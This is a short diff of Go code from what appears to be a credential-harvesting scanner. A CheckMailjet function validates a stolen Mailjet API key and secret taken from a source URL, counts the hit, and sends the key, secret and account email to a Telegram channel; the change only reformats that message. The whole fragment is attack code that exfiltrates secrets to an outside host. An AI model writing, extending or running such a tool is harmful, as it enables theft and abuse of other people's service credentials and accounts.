@@ -64,7 +64,7 @@ func (a *AWSScanner) CheckMailjet(apiKey, secretKey, sourceURL string) bool {
 	globalCounters.mu.Unlock()
 
 	msg := a.tgHit("✉️", "MAILJET", sourceURL) + fmt.Sprintf(
-		"\n🔑 <b>API Key:</b> <code>%s</code>\n🔐 <b>Secret Key:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n", apiKey, secretKey, info)
+		"API Key : %s\nSecret Key : %s\nEmail : %s\n", apiKey, secretKey, info)
 	go a.sendTelegram(msg)
 	return true
 }
